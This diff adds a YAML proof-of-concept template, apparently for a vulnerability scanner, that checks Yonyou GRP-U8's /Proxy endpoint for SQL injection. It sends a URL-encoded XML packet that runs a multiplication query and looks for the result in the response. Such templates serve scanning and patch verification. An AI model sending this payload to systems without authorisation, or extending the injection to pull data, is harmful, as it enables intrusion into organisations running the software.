@@ -1,0 +1,15 @@
+name: poc-yaml-yonyou-grp-u8-sqli
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /Proxy
+    body: >
+      cVer=9.8.0&dp=%3c?xml%20version%3d%221.0%22%20encoding%3d%22GB2312%22?%3e%3cR9PACKET%20version%3d%221%22%3e%3cDATAFORMAT%3eXML%3c%2fDATAFORMAT%3e%3cR9FUNCTION%3e%3cNAME%3eAS_DataRequest%3c%2fNAME%3e%3cPARAMS%3e%3cPARAM%3e%3cNAME%3eProviderName%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3eDataSetProviderData%3c%2fDATA%3e%3c%2fPARAM%3e%3cPARAM%3e%3cNAME%3eData%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3e%20select%20{{r1}}%2a{{r2}}%20%3c%2fDATA%3e%3c%2fPARAM%3e%3c%2fPARAMS%3e%3c%2fR9FUNCTION%3e%3c%2fR9PACKET%3e
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+detail:
+  author: 凉风(http://webkiller.cn/)
+  links:
+    - https://www.hacking8.com/bug-web/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B-GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
